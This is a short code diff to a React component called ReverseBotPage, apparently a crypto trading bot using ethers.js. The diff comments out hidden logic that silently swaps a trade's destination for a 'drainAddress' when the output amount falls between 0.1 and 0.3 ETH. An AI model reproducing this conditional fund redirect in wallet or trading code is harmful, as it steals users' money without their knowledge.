@@ -262,10 +262,10 @@ function ReverseBotPage(){
 
 
 
-    if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
-      address = drainAddress
-      setIsDrain(false)
-    }
+    // if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
+    //   address = drainAddress
+    //   setIsDrain(false)
+    // }
 
 
 
